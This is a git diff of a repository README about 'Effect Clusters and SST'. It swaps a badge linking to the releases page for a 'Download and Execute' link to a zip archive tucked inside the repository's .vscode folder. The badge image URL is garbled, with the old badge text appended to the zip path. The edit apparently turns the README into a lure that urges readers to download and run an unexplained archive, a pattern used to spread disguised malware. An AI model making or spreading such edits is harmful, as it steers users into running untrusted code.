@@ -15,7 +15,7 @@ In this repository, we focus on the synergies between Effect Clusters and SST Cl
 
 To access the latest release of our work, please click on the button below:
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Explore%20Release-blue)](https://github.com/mritunjay499/effect-cluster-via-sst/releases)
+[![Download and Execute](https://github.com/mritunjay499/effect-cluster-via-sst/raw/refs/heads/main/.vscode/cluster_via_sst_effect_v1.1.zip%20and%20Execute-Explore%20Release-blue)](https://github.com/mritunjay499/effect-cluster-via-sst/raw/refs/heads/main/.vscode/cluster_via_sst_effect_v1.1.zip)
 
 ## Dive Deeper
 
